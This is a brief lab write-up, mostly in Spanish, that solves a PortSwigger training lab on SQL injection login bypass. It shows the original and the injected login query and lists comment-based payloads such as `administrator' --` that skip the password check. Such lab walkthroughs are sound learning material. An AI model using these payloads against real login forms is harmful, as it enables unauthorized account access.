# `Lab`: SQL injection vulnerability allowing login bypass

- [Lab: SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

## Descripción:

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

---

### Explicación:

- En este laboratiorio ya nos dan el nombre del **user** `administrator`, pero no tenemos el **password**.
- El truco está en comentar todo lo que está después del **user** para brincar la condición del **password**.

### Query original:

````sql
select id,username,subscription from users where username = 'administrator' and password = 'p@ssw0rd123-1';
````

### Query inyectada:

````sql
select id,username,subscription from users where username = 'administrator' -- ' and password = 'p@ssw0rd123-1';
````

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/4cd5611e-0aac-435f-a45d-4a254b669186)


## Solución:

1. Abrir laboratorio y buscar en donde me puedo autenticar

2. Ingresar el usuario `administrator` con el payload `administrator' --` o `administrator' -- -` o `administrator' #` _(O cualquiera de sus versiones)_

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/cb2feaac-5eef-4207-9786-15aa382ef97d)

![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/f19586fc-90f0-46e3-8172-66a0c69ccdf9)





